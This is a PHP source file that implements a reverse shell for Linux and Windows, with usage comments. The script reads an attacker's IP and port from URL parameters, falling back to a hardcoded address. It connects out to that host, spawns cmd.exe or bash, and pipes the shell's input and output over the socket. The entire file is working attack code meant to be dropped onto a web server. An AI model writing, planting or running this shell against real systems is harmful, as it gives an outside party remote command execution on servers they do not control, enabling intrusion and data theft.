<?php
// Universal PHP reverse shell — Linux + Windows
// Usage: shell.php?ip=10.10.10.10&port=9001
// Or hardcode below as fallback

$ip   = isset($_GET['ip'])   ? $_GET['ip']   : '10.10.10.10';
$port = isset($_GET['port']) ? $_GET['port'] : '9001';

// Detect OS and pick the right shell
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    // Windows — use cmd.exe
    $shell = 'cmd.exe';
} else {
    // Linux/Unix — use bash if available, fall back to sh
    $shell = file_exists('/bin/bash') ? '/bin/bash' : '/bin/sh';
}

set_time_limit(0);
$sock = fsockopen($ip, (int)$port, $errno, $errstr, 30);
if (!$sock) { die("$errstr ($errno)\n"); }

$descriptorspec = [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w'],
];

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { die("Can't spawn shell\n"); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock,     0);

while (!feof($sock) && !feof($pipes[1])) {
    $r = [$sock, $pipes[1], $pipes[2]];
    $w = $e = null;
    stream_select($r, $w, $e, null);

    if (in_array($sock,      $r)) fwrite($pipes[0], fread($sock,      1400));
    if (in_array($pipes[1],  $r)) fwrite($sock,     fread($pipes[1],  1400));
    if (in_array($pipes[2],  $r)) fwrite($sock,     fread($pipes[2],  1400));
}

fclose($sock);
array_map('fclose', $pipes);
proc_close($process);
